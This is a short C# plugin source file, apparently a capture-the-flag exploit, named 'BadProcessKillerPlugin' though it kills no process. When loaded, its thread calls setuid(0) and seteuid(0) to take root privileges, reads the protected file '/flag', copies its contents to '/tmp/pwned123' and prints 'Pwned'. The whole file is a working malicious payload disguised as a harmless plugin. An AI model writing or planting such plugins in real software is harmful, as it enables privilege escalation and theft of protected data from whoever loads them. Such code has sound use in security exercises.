using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Mono.Unix;

namespace BadProcessKillerPlugin
{
    public static class EntryPoint
    {
        public static string BAD_PROCESS_NAME = "tcpdump";
        public static void StartPlugin()
        {
            new Thread(new ThreadStart(InternalThread)).Start();
        }

        public static void InternalThread()
        {
            Mono.Unix.Native.Syscall.setuid(0);
            Mono.Unix.Native.Syscall.seteuid(0);

            var flag = System.IO.File.ReadAllText("/flag");
            System.IO.File.WriteAllText("/tmp/pwned123", flag); 
            Console.WriteLine("Pwned");
            
        }
    }
}

